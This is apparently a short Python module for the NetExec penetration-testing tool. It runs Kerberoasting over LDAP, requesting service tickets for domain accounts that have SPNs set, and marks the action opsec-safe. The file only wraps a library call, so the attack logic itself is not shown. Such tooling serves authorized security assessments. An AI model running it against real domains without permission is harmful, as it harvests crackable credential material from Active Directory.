from typing import Dict


class NXCModule:
    """Perform Kerberoasting via LDAP."""

    name = "kerberoast"
    description = "Request service tickets for accounts with SPN set"
    supported_protocols = ["ldap"]
    opsec_safe = True
    multiple_hosts = False

    def options(self, context, module_options: Dict[str, str]):
        """No options available."""

    def on_login(self, context, connection):
        context.log.display("Running Kerberoasting against domain users")
        connection.kerberoasting()
